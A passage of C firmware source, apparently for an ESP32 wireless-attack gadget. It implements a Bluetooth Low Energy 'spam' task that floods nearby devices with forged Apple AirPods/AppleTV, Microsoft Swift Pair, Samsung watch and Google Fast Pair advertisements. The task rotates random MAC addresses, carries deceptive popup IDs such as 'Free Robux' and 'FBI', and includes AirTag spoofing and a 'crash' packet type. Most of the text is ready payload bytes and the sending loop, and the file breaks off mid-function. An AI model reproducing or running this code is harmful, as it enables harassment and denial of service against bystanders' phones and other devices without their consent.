#include "esp_log.h"
#include "nvs_flash.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <esp_wifi.h>
#include "esp_heap_caps.h"
#ifndef CONFIG_IDF_TARGET_ESP32S2
#include "core/callbacks.h"
#include "esp_random.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "host/ble_sm.h"
#include "host/util/util.h"
#include "managers/ble_manager.h"
#include "managers/views/terminal_screen.h"
#include "core/glog.h"
#include "nimble/ble.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "vendor/pcap.h"
#include <esp_mac.h>
#include <managers/rgb_manager.h>
#include "managers/settings_manager.h"
#include "managers/status_display_manager.h"
#include "esp_bt.h"
#include "managers/ap_manager.h"
#include "managers/wifi_manager.h"

#define MAX_DEVICES 30
#define MAX_HANDLERS 10
#define MAX_PACKET_SIZE 31
#define NIMBLE_HOST_TASK_STACK_SIZE 6144

// Flipper tracking definitions
#define MAX_FLIPPERS 50
typedef struct {
    ble_addr_t addr;
    char name[32];
    int8_t rssi;
} FlipperDevice;
static FlipperDevice discovered_flippers[MAX_FLIPPERS];
static int discovered_flipper_count = 0;
static int selected_flipper_index = -1; // Index of the Flipper selected for tracking

static const char *TAG_BLE = "BLE_MANAGER";
static int airTagCount = 0;
static bool ble_initialized = false;
static volatile bool ble_stack_ready = false;

static esp_timer_handle_t flush_timer = NULL;
static TaskHandle_t nimble_host_task_handle = NULL;
static uint32_t ble_pcap_packet_count = 0;
static uint32_t ble_pcap_event_total_count = 0;

#ifndef CONFIG_IDF_TARGET_ESP32S2
static bool ble_ap_suspended = false;
static bool ble_wifi_suspended = false;
static wifi_mode_t ble_prev_wifi_mode = WIFI_MODE_NULL;
#endif

// Forward declarations
static void generate_random_mac(uint8_t *mac_addr);
static void restart_ble_stack(void);
static void ble_prepare_hs_config(void);
static void ble_on_sync(void);
static void ble_on_reset(int reason);
static void ble_suspend_networking(void);
static void ble_resume_networking(void);
static void parse_device_name(const uint8_t *data, size_t len, char *name_buf, size_t name_buf_len);
static const char *detect_flipper_type_from_adv(const uint8_t *data, size_t len);
static int ble_gap_event_general(struct ble_gap_event *event, void *arg);

typedef struct {
    ble_data_handler_t handler;
} ble_handler_t;

// Structure to store discovered AirTag information
typedef struct {
    ble_addr_t addr;
    uint8_t payload[BLE_HS_ADV_MAX_SZ]; // Store the full payload
    size_t payload_len;
    int8_t rssi;
    bool selected_for_spoofing;
} AirTagDevice;

#define MAX_AIRTAGS 50 // Maximum number of AirTags to store
#define AIRTAG_RSSI_LOG_INTERVAL_MS 3000
static AirTagDevice discovered_airtags[MAX_AIRTAGS];
static int discovered_airtag_count = 0;
static int selected_airtag_index = -1; // Index of the AirTag selected for spoofing
static TickType_t airtag_last_rssi_log[MAX_AIRTAGS];

static ble_handler_t handlers[MAX_HANDLERS];
static int handler_count = 0;
static int spam_counter = 0;
static bool last_company_id_valid = false;
static uint16_t last_company_id_value = 0;
static TickType_t last_detection_time = 0;
static void ble_pcap_callback(struct ble_gap_event *event, size_t len);

// spam tracking vars
static volatile uint32_t spam_adv_count = 0;
static esp_timer_handle_t spam_log_timer = NULL;
static int spam_log_interval_ms = 5000;
static TaskHandle_t spam_task_handle = NULL;
static volatile bool spam_running = false;
static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;

// Apple Continuity Protocol Support
typedef enum {
    CONTINUITY_TYPE_PROXIMITY_PAIR = 0x07,
    CONTINUITY_TYPE_NEARBY_ACTION = 0x0F,
    CONTINUITY_TYPE_CUSTOM_CRASH = 0x0F  // Same as nearby action but with special payload
} continuity_type_t;

typedef struct {
    uint16_t model;
    const char* name;
    uint8_t colors[8];  // Up to 8 color options per device
    uint8_t color_count;
} apple_device_t;

// Apple/Beats device models with colors
static const apple_device_t apple_devices[] = {
    {0x0E20, "AirPods Pro", {0x00}, 1},
    {0x0A20, "AirPods Max", {0x00, 0x02, 0x03, 0x0F, 0x11}, 5},
    {0x0055, "AirTag", {0x00}, 1},
    {0x0030, "Hermes AirTag", {0x00}, 1},
    {0x0220, "AirPods", {0x00}, 1},
    {0x0F20, "AirPods 2nd Gen", {0x00}, 1},
    {0x1320, "AirPods 3rd Gen", {0x00}, 1},
    {0x1420, "AirPods Pro 2nd Gen", {0x00}, 1},
    {0x1020, "Beats Flex", {0x00, 0x01}, 2},
    {0x0620, "Beats Solo 3", {0x00, 0x01, 0x06, 0x07, 0x08, 0x09, 0x0E, 0x0F}, 8},
    {0x0320, "Powerbeats 3", {0x00, 0x01, 0x0B, 0x0C, 0x0D, 0x12, 0x13, 0x14}, 8},
    {0x0B20, "Powerbeats Pro", {0x00, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0B, 0x0D}, 8},
    {0x0C20, "Beats Solo Pro", {0x00, 0x01}, 2},
    {0x1120, "Beats Studio Buds", {0x00, 0x01, 0x02, 0x03, 0x04, 0x06}, 6},
    {0x0520, "Beats X", {0x00, 0x01, 0x02, 0x05, 0x1D, 0x25}, 6},
    {0x0920, "Beats Studio 3", {0x00, 0x01, 0x02, 0x03, 0x18, 0x19, 0x25, 0x26}, 8},
    {0x1720, "Beats Studio Pro", {0x00, 0x01}, 2},
    {0x1220, "Beats Fit Pro", {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}, 8},
    {0x1620, "Beats Studio Buds+", {0x00, 0x01, 0x02, 0x03, 0x04}, 5}
};

// Nearby Action types
static const struct {
    uint8_t action;
    const char* name;
} nearby_actions[] = {
    {0x13, "AppleTV AutoFill"},
    {0x24, "Apple Vision Pro"},
    {0x05, "Apple Watch"},
    {0x27, "AppleTV Connecting..."},
    {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"},
    {0x1E, "AppleTV Color Balance"},
    {0x09, "Setup New iPhone"},
    {0x2F, "Sign in to other device"},
    {0x02, "Transfer Phone Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"},
    {0x0D, "HomeKit AppleTV Setup"},
    {0x2B, "AppleID for AppleTV?"}
};

#define APPLE_DEVICES_COUNT (sizeof(apple_devices) / sizeof(apple_devices[0]))
#define NEARBY_ACTIONS_COUNT (sizeof(nearby_actions) / sizeof(nearby_actions[0]))

// AppleJuice Payload Data - proper device IDs
const uint8_t IOS1[] = {
    /* Airpods */ 0x02,
    /* AirpodsPro */ 0x0e,
    /* AirpodsMax */ 0x0a,
    /* AirpodsGen2 */ 0x0f,
    /* AirpodsGen3 */ 0x13,
    /* AirpodsProGen2 */ 0x14,
    /* PowerBeats */ 0x03,
    /* PowerBeatsPro */ 0x0b,
    /* BeatsSoloPro */ 0x0c,
    /* BeatsStudioBuds */ 0x11,
    /* BeatsFlex */ 0x10,
    /* BeatsX */ 0x05,
    /* BeatsSolo3 */ 0x06,
    /* BeatsStudio3 */ 0x09,
    /* BeatsStudioPro */ 0x17,
    /* BeatsFitPro */ 0x12,
    /* BeatsStdBudsPlus */ 0x16,
};

const uint8_t IOS2[] = {
    /* AppleTVSetup */ 0x01,
    /* AppleTVPair */ 0x06,
    /* AppleTVNewUser */ 0x20,
    /* AppleTVAppleIDSetup */ 0x2b,
    /* AppleTVWirelessAudioSync */ 0xc0,
    /* AppleTVHomekitSetup */ 0x0d,
    /* AppleTVKeyboard */ 0x13,
    /* AppleTVConnectingNetwork */ 0x27,
    /* HomepodSetup */ 0x0b,
    /* SetupNewPhone */ 0x09,
    /* TransferNumber */ 0x02,
    /* TVColorBalance */ 0x1e,
    /* AppleVisionPro */ 0x24,
};

typedef struct {
    uint32_t value;
} DeviceType;

const DeviceType android_models[] = {
    // Genuine non-production/forgotten devices
    {0x0001F0}, // Bisto CSR8670 Dev Board
    {0x000047}, // Arduino 101
    {0x470000}, // Arduino 101 2
    {0x00000A}, // Anti-Spoof Test
    {0x00000B}, // Google Gphones
    {0x00000D}, // Test 00000D
    {0x000007}, // Android Auto
    {0x000009}, // Test Android TV
    {0x090000}, // Test Android TV 2
    {0x000048}, // Fast Pair Headphones
    {0x001000}, // LG HBS1110
    {0x00B727}, // Smart Controller 1
    {0x01E5CE}, // BLE-Phone
    {0x0200F0}, // Goodyear
    {0x00F7D4}, // Smart Setup
    {0xF00002}, // Goodyear
    {0xF00400}, // T10
    {0x1E89A7}, // ATS2833_EVB

    // Genuine devices
    {0xCD8256}, // Bose NC 700
    {0x0000F0}, // Bose QuietComfort 35 II
    {0xF00000}, // Bose QuietComfort 35 II 2
    {0x821F66}, // JBL Flip 6
    {0xF52494}, // JBL Buds Pro
    {0x718FA4}, // JBL Live 300TWS
    {0x0002F0}, // JBL Everest 110GA
    {0x92BBBD}, // Pixel Buds
    {0x000006}, // Google Pixel buds
    {0x060000}, // Google Pixel buds 2
    {0xD446A7}, // Sony XM5
    {0x038B91}, // DENON AH-C830NCW
    {0x02F637}, // JBL LIVE FLEX
    {0x02D886}, // JBL REFLECT MINI NC
    {0xF00001}, // Bose QuietComfort 35 II
    {0xF00201}, // JBL Everest 110GA
    {0xF00209}, // JBL LIVE400BT
    {0xF00205}, // JBL Everest 310GA
    {0xF00305}, // LG HBS-1500
    {0xF00E97}, // JBL VIBE BEAM
    {0x04ACFC}, // JBL WAVE BEAM
    {0x04AA91}, // Beoplay H4
    {0x04AFB8}, // JBL TUNE 720BT
    {0x05A963}, // WONDERBOOM 3
    {0x05AA91}, // B&O Beoplay E6
    {0x05C452}, // JBL LIVE220BT
    {0x05C95C}, // Sony WI-1000X
    {0x0602F0}, // JBL Everest 310GA
    {0x0603F0}, // LG HBS-1700
    {0x1E8B18}, // SRS-XB43
    {0x1E955B}, // WI-1000XM2
    {0x1EC95C}, // Sony WF-SP700N
    {0x06AE20}, // Galaxy S21 5G
    {0x06C197}, // OPPO Enco Air3 Pro
    {0x06C95C}, // Sony WH-1000XM2
    {0x06D8FC}, // soundcore Liberty 4 NC
    {0x0744B6}, // Technics EAH-AZ60M2
    {0x07A41C}, // WF-C700N
    {0x07C95C}, // Sony WH-1000XM2
    {0x07F426}, // Nest Hub Max
    {0x0102F0}, // JBL Everest 110GA - Gun Metal
    {0x054B2D}, // JBL TUNE125TWS
    {0x0660D7}, // JBL LIVE770NC
    {0x0103F0}, // LG HBS-835
    {0x0903F0}, // LG HBS-2000

    // Custom debug popups
    {0xD99CA1}, // Flipper Zero
    {0x77FF67}, // Free Robux
    {0xAA187F}, // Free VBucks
    {0xDCE9EA}, // Rickroll
    {0x87B25F}, // Animated Rickroll
    {0x1448C9}, // BLM
    {0x13B39D}, // Talking Sasquach
    {0x7C6CDB}, // Obama
    {0x005EF9}, // Ryanair
    {0xE2106F}, // FBI
    {0xB37A62}, // Tesla
    {0x92ADC9}, // Ton Upgrade Netflix
};

typedef struct {
    uint8_t value;
    const char* name;
} WatchModel;

const WatchModel watch_models[] = {
    {0x1A, "Fallback Watch"},
    {0x01, "White Watch4 Classic 44m"},
    {0x02, "Black Watch4 Classic 40m"},
    {0x03, "White Watch4 Classic 40m"},
    {0x04, "Black Watch4 44mm"},
    {0x05, "Silver Watch4 44mm"},
    {0x06, "Green Watch4 44mm"},
    {0x07, "Black Watch4 40mm"},
    {0x08, "White Watch4 40mm"},
    {0x09, "Gold Watch4 40mm"},
    {0x0A, "French Watch4"},
    {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44mm"},
    {0x11, "Black Watch5 44mm"},
    {0x12, "Sapphire Watch5 44mm"},
    {0x13, "Purpleish Watch5 40mm"},
    {0x14, "Gold Watch5 40mm"},
    {0x15, "Black Watch5 Pro 45mm"},
    {0x16, "Gray Watch5 Pro 45mm"},
    {0x17, "White Watch5 44mm"},
    {0x18, "White & Black Watch5"},
    {0x1B, "Black Watch6 Pink 40mm"},
    {0x1C, "Gold Watch6 Gold 40mm"},
    {0x1D, "Silver Watch6 Cyan 44mm"},
    {0x1E, "Black Watch6 Classic 43m"},
    {0x20, "Green Watch6 Classic 43m"},
};

// Apple Continuity Protocol packet generators
static void generate_proximity_pair_packet(uint8_t* adv_data, size_t* adv_len, uint16_t device_model, uint8_t color) {
    *adv_len = 0;
    
    // Flags
    adv_data[(*adv_len)++] = 0x02; // Length
    adv_data[(*adv_len)++] = 0x01; // Type: Flags
    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
    
    // Apple Continuity Service Data
    adv_data[(*adv_len)++] = 0x1A; // Length (26 bytes)
    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
    adv_data[(*adv_len)++] = 0xFE; 
    
    // Continuity Header
    adv_data[(*adv_len)++] = CONTINUITY_TYPE_PROXIMITY_PAIR; // Type: Proximity Pair
    adv_data[(*adv_len)++] = 0x15; // Length of data
    adv_data[(*adv_len)++] = 0x01; // Status flags
    
    // Device Model (little endian)
    adv_data[(*adv_len)++] = device_model & 0xFF;
    adv_data[(*adv_len)++] = (device_model >> 8) & 0xFF;
    
    // Status and Color
    adv_data[(*adv_len)++] = 0x00; // Status
    adv_data[(*adv_len)++] = color; // Color
    
    // Random data (encrypted payload simulation)
    for (int i = 0; i < 16; i++) {
        adv_data[(*adv_len)++] = esp_random() & 0xFF;
    }
}

static void generate_nearby_action_packet(uint8_t* adv_data, size_t* adv_len, uint8_t action_type) {
    *adv_len = 0;
    
    // Flags
    adv_data[(*adv_len)++] = 0x02; // Length
    adv_data[(*adv_len)++] = 0x01; // Type: Flags
    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
    
    // Apple Continuity Service Data
    adv_data[(*adv_len)++] = 0x08; // Length (8 bytes)
    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
    adv_data[(*adv_len)++] = 0xFE;
    
    // Continuity Header
    adv_data[(*adv_len)++] = CONTINUITY_TYPE_NEARBY_ACTION; // Type: Nearby Action
    adv_data[(*adv_len)++] = 0x03; // Length of data
    adv_data[(*adv_len)++] = action_type; // Action type
    adv_data[(*adv_len)++] = 0x00; // Action flags
    adv_data[(*adv_len)++] = 0x00; // Authentication tag
}

static void spam_log_timer_cb(TimerHandle_t xTimer) {
    const char *type_name = "unknown";
    switch (current_spam_type) {
        case BLE_SPAM_APPLE: type_name = "apple"; break;
        case BLE_SPAM_MICROSOFT: type_name = "microsoft"; break;
        case BLE_SPAM_SAMSUNG: type_name = "samsung"; break;
        case BLE_SPAM_GOOGLE: type_name = "google"; break;
        case BLE_SPAM_RANDOM: type_name = "random"; break;
        case BLE_SPAM_FLIPPERZERO: type_name = "flipper"; break;
    }
    printf("ble spam (%s): %lu packets sent\n", type_name, (unsigned long)spam_adv_count);
    TERMINAL_VIEW_ADD_TEXT("ble spam (%s): %lu packets sent\n", type_name, (unsigned long)spam_adv_count);
}

// forward declarations for spam payload builders
static void generate_random_name(char *name, size_t max_len);
static void build_microsoft_mfg(const char *name, uint8_t *buf, size_t *len);
static void build_apple_mfg(uint8_t *buf, size_t *len);
static void build_samsung_mfg(uint8_t *buf, size_t *len);
static void build_google_mfg(uint8_t *buf, size_t *len);

static void spam_task(void *arg) {
    while (spam_running) {
        if (ble_gap_adv_active()) {
            int rc = ble_gap_adv_stop();
            if (rc != 0) {
                ESP_LOGW(TAG_BLE, "Failed to stop advertising: %d", rc);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        if (current_spam_type != BLE_SPAM_APPLE) {
            uint8_t rnd_addr[6];
            generate_random_mac(rnd_addr);
            int rc = ble_hs_id_set_rnd(rnd_addr);
            if (rc != 0) {
                ESP_LOGW(TAG_BLE, "Failed to set random address: %d", rc);
            } else {
                ESP_LOGD(TAG_BLE, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X",
                         rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(10));

        struct ble_hs_adv_fields fields;
        memset(&fields, 0, sizeof(fields));
        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;

        uint8_t mfg_buf[31];
        size_t mfg_len = 0;
        uint8_t full_adv[31];
        size_t full_adv_len = 0;
        int use_full_adv = 0;

        if (current_spam_type == BLE_SPAM_MICROSOFT) {
            char name[8];
            generate_random_name(name, sizeof(name));
            build_microsoft_mfg(name, mfg_buf, &mfg_len);
        } else if (current_spam_type == BLE_SPAM_APPLE) {
            // Use AppleJuice preset adv structures
            static const uint8_t dataAirpods[31]             = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAirpodsPro[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAirpodsMax[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAirpodsGen2[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAirpodsGen3[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAirpodsProGen2[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataPowerBeats[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataPowerBeatsPro[31]       = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsSoloPro[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsStudioBuds[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsFlex[31]           = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsX[31]              = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsSolo3[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsStudio3[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsStudioPro[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsFitPro[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataBeatsStudioBudsPlus[31] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            static const uint8_t dataAppleTVSetup[23]        = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVPair[23]         = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVNewUser[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVAppleIDSetup[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x2b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVWirelessAudioSync[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0xc0,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVHomekitSetup[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVKeyboard[23]     = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataAppleTVConnectingToNetwork[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataHomepodSetup[23]        = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataSetupNewPhone[23]       = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataTransferNumber[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
            static const uint8_t dataTVColorBalance[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};

            const uint8_t *sel = NULL;
            size_t sel_len = 0;

            static const uint8_t *apple_adv_payloads[] = {
                dataAirpods,
                dataAirpodsPro,
                dataAirpodsMax,
                dataAirpodsGen2,
                dataAirpodsGen3,
                dataAirpodsProGen2,
                dataPowerBeats,
                dataPowerBeatsPro,
                dataBeatsSoloPro,
                dataBeatsStudioBuds,
                dataBeatsFlex,
                dataBeatsX,
                dataBeatsSolo3,
                dataBeatsStudio3,
                dataBeatsStudioPro,
                dataBeatsFitPro,
                dataBeatsStudioBudsPlus,
                dataAppleTVSetup,
                dataAppleTVPair,
                dataAppleTVNewUser,
                dataAppleTVAppleIDSetup,
                dataAppleTVWirelessAudioSync,
                dataAppleTVHomekitSetup,
                dataAppleTVKeyboard,
                dataAppleTVConnectingToNetwork,
                dataHomepodSetup,
                dataSetupNewPhone,
                dataTransferNumber,
                dataTVColorBalance
            };
            static const size_t apple_adv_sizes[] = {
                sizeof(dataAirpods),
                sizeof(dataAirpodsPro),
                sizeof(dataAirpodsMax),
                sizeof(dataAirpodsGen2),
                sizeof(dataAirpodsGen3),
                sizeof(dataAirpodsProGen2),
                sizeof(dataPowerBeats),
                sizeof(dataPowerBeatsPro),
                sizeof(dataBeatsSoloPro),
                sizeof(dataBeatsStudioBuds),
                sizeof(dataBeatsFlex),
                sizeof(dataBeatsX),
                sizeof(dataBeatsSolo3),
                sizeof(dataBeatsStudio3),
                sizeof(dataBeatsStudioPro),
                sizeof(dataBeatsFitPro),
                sizeof(dataBeatsStudioBudsPlus),
                sizeof(dataAppleTVSetup),
                sizeof(dataAppleTVPair),
                sizeof(dataAppleTVNewUser),
                sizeof(dataAppleTVAppleIDSetup),
                sizeof(dataAppleTVWirelessAudioSync),
                sizeof(dataAppleTVHomekitSetup),
                sizeof(dataAppleTVKeyboard),
                sizeof(dataAppleTVConnectingToNetwork),
                sizeof(dataHomepodSetup),
                sizeof(dataSetupNewPhone),
                sizeof(dataTransferNumber),
                sizeof(dataTVColorBalance)
            };
            uint32_t apple_adv_count = sizeof(apple_adv_payloads) / sizeof(apple_adv_payloads[0]);
            uint32_t idx = esp_random() % apple_adv_count;
            sel = apple_adv_payloads[idx];
            sel_len = apple_adv_sizes[idx];

            if (sel && sel_len > 0 && sel_len <= sizeof(full_adv)) {
                memcpy(full_adv, sel, sel_len);
                full_adv_len = sel_len;
                use_full_adv = 1;
            } else {
                continue;
            }
        } else if (current_spam_type == BLE_SPAM_SAMSUNG) {
            build_samsung_mfg(mfg_buf, &mfg_len);
        } else if (current_spam_type == BLE_SPAM_GOOGLE) {
            build_google_mfg(mfg_buf, &mfg_len);
        } else if (current_spam_type == BLE_SPAM_RANDOM) {
            int rand_type = esp_random() % 4;
            if (rand_type == 0) {
                char name[8];
                generate_random_name(name, sizeof(name));
                build_microsoft_mfg(name, mfg_buf, &mfg_len);
            } else if (rand_type == 1) {
                uint8_t adv_data[31];
                size_t adv_len = 0;
                
                if (esp_random() % 2 == 0) {
                    uint32_t device_idx = esp_random() % APPLE_DEVICES_COUNT;
                    const apple_device_t* device = &apple_devices[device_idx];
                    uint8_t color = device->colors[esp_random() % device->color_count];
                    generate_proximity_pair_packet(adv_data, &adv_len, device->model, color);
                } else {
                    uint32_t action_idx = esp_random() % NEARBY_ACTIONS_COUNT;
                    uint8_t action_type = nearby_actions[action_idx].action;
                    generate_nearby_action_packet(adv_data, &adv_len, action_type);
                }
                
                if (adv_len >= 9) {
                    uint8_t* service_data_start = NULL;
                    size_t remaining = adv_len - 3;
                    uint8_t* ptr = &adv_data[3];
                    
                    while (remaining > 0) {
                        uint8_t len = ptr[0];
                        uint8_t type = ptr[1];
                        
                        if (type == 0x16 && len >= 4) {
                            if (ptr[2] == 0xD2 && ptr[3] == 0xFE) {
                                service_data_start = &ptr[4];
                                break;
                            }
                        }
                        
                        ptr += len + 1;
                        remaining -= len + 1;
                    }
                    
                    if (service_data_start && (service_data_start - adv_data) < adv_len) {
                        mfg_buf[0] = 0x4C;
                        mfg_buf[1] = 0x00;
                        
                        size_t continuity_data_len = adv_len - (service_data_start - adv_data);
                        if (continuity_data_len <= sizeof(mfg_buf) - 2) {
                            memcpy(&mfg_buf[2], service_data_start, continuity_data_len);
                            mfg_len = continuity_data_len + 2;
                        } else {
                            ESP_LOGW(TAG_BLE, "Random Apple Continuity data too large, truncating");
                            memcpy(&mfg_buf[2], service_data_start, sizeof(mfg_buf) - 2);
                            mfg_len = sizeof(mfg_buf);
                        }
                    } else {
                        ESP_LOGE(TAG_BLE, "Could not find random Apple Continuity service data");
                        continue;
                    }
                } else {
                    ESP_LOGE(TAG_BLE, "Invalid random Apple Continuity packet size: %zu", adv_len);
                    continue;
                }
            } else if (rand_type == 2) {
                build_samsung_mfg(mfg_buf, &mfg_len);
            } else {
                build_google_mfg(mfg_buf, &mfg_len);
            }
        }

        // build raw advertisement data
        uint8_t adv_data[31];
        size_t adv_len = 0;

        if (use_full_adv) {
